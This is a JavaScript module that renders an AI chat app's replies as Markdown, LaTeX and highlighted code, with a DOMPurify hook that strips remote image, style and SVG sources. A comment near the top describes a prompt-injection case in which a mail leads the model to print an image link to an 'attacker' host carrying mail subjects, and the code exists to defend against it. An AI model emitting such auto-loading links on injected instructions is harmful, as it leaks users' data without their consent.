// Markdown + LaTeX + code highlighting for model replies. All bundled locally (works offline).
import { Marked } from 'marked';
import markedKatex from 'marked-katex-extension';
import { markedHighlight } from 'marked-highlight';
import DOMPurify from 'dompurify';
import hljs from 'highlight.js/lib/core';
import javascript from 'highlight.js/lib/languages/javascript';
import typescript from 'highlight.js/lib/languages/typescript';
import python from 'highlight.js/lib/languages/python';
import rust from 'highlight.js/lib/languages/rust';
import json from 'highlight.js/lib/languages/json';
import bash from 'highlight.js/lib/languages/bash';
import powershell from 'highlight.js/lib/languages/powershell';
import css from 'highlight.js/lib/languages/css';
import xml from 'highlight.js/lib/languages/xml';
import sql from 'highlight.js/lib/languages/sql';
import cpp from 'highlight.js/lib/languages/cpp';
import java from 'highlight.js/lib/languages/java';
import yaml from 'highlight.js/lib/languages/yaml';
import markdown from 'highlight.js/lib/languages/markdown';
import 'katex/dist/katex.min.css';

// A reply is drawn the moment it arrives, so anything in it that loads by itself (an image, a video poster, a background, a style)
// would send a request with no tool call and no approval: a mail could ask for ![](https://attacker/?q=<subjects>) and the model
// might print it. This sanitiser (its own instance, so other users of DOMPurify are untouched) keeps only data: and blob: sources;
// links stay links, since following one is the person's own click.
const purify = DOMPurify(window);
const LOCAL_SRC = /^\s*(data:|blob:)/i;
const SRC_ATTRS = ['src', 'srcset', 'poster', 'background', 'lowsrc', 'dynsrc', 'data', 'codebase', 'action', 'formaction'];
purify.addHook('afterSanitizeAttributes', (node) => {
  for (const a of SRC_ATTRS) { const v = node.getAttribute?.(a); if (v != null && (a === 'srcset' || !LOCAL_SRC.test(v))) node.removeAttribute(a); }
  node.removeAttribute?.('ping');
  // SVG pulls in other documents with href on image, use and feImage; only same-document references (#id) stay
  if (/^(image|use|feimage)$/i.test(node.nodeName)) for (const a of ['href', 'xlink:href']) { const v = node.getAttribute(a); if (v != null && !/^\s*#/.test(v)) node.removeAttribute(a); }
  const style = node.getAttribute?.('style');
  if (style && /url\s*\(\s*['"]?\s*(?!#|data:)/i.test(style)) node.removeAttribute('style');
});
const PURIFY = { ADD_ATTR: ['target'], FORBID_TAGS: ['style', 'link', 'meta', 'base'] };

Object.entries({
  javascript, typescript, python, rust, json, bash, powershell, css, xml, sql, cpp, java, yaml, markdown,
}).forEach(([name, lang]) => hljs.registerLanguage(name, lang));
hljs.registerAliases(['js'], { languageName: 'javascript' });
hljs.registerAliases(['ts'], { languageName: 'typescript' });
hljs.registerAliases(['py'], { languageName: 'python' });
hljs.registerAliases(['rs'], { languageName: 'rust' });
hljs.registerAliases(['sh', 'shell', 'zsh'], { languageName: 'bash' });
hljs.registerAliases(['ps1'], { languageName: 'powershell' });
hljs.registerAliases(['html'], { languageName: 'xml' });
hljs.registerAliases(['c', 'h', 'hpp'], { languageName: 'cpp' });
hljs.registerAliases(['yml'], { languageName: 'yaml' });
hljs.registerAliases(['md'], { languageName: 'markdown' });

const escapeHtml = (t) => t.replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));

// Highlighted HTML for a code string (used by code blocks and the artifact source view).
export function highlightCode(code, lang) {
  return hljs.getLanguage(lang) ? hljs.highlight(code, { language: lang }).value : hljs.highlightAuto(code).value;
}

const marked = new Marked(
  markedHighlight({
    emptyLangClass: 'hljs',
    langPrefix: 'hljs language-',
    highlight: highlightCode,
  }),
  markedKatex({ throwOnError: false, nonStandard: true }),
  {
    gfm: true,
    breaks: false,
    // Code blocks get a header (language + copy button). Highlighting already ran, so `text` is HTML.
    renderer: {
      code({ text, lang }) {
        const name = escapeHtml((lang || '').split(/\s/)[0]);
        return `<div class="code-box"><div class="code-head"><span>${name || 'code'}</span><button type="button" class="copy-btn">COPY</button></div><pre><code class="hljs language-${name}">${text}</code></pre></div>`;
      },
    },
  },
);

// Models often write math as \( ... \) and \[ ... \]; convert to $ / $$ outside code.
function normaliseMath(text) {
  return text
    .split(/(```[\s\S]*?(?:```|$)|`[^`\n]*`)/g)
    .map((part, i) => (i % 2 ? part : part
      .replace(/\\\[([\s\S]+?)\\\]/g, (_, m) => `\n$$${m}$$\n`)
      .replace(/\\\(([\s\S]+?)\\\)/g, (_, m) => `$${m}$`)))
    .join('');
}

// A reply is drawn again on every paint while it streams, but all of it except the last block is the same as
// the paint before. So it is rendered block by block (a block is a paragraph, a list, a code fence, a table...)
// and each block's finished, sanitised HTML is remembered: only the block still being written is worked out again.
const blocks = new Map();
const BLOCK_CACHE = 600;
// The same, as a list: one entry per block, so a caller can tell which blocks did not change (chat-ui.js).
export function renderBlocks(text) {
  const tokens = marked.lexer(normaliseMath(text));
  const list = [];
  for (const t of tokens) {
    if (t.type === 'space') continue;
    const key = `${t.type}\u0000${t.raw}`;
    let part = blocks.get(key);
    if (part === undefined) {
      const one = [t];
      if (marked.defaults.walkTokens) marked.walkTokens(one, marked.defaults.walkTokens); // the code highlighter hooks in here
      part = purify.sanitize(marked.parser(one), PURIFY);
      if (blocks.size >= BLOCK_CACHE) blocks.delete(blocks.keys().next().value);
      blocks.set(key, part);
    }
    list.push(part);
  }
  return list;
}
export const renderMarkdown = (text) => renderBlocks(text).join('');
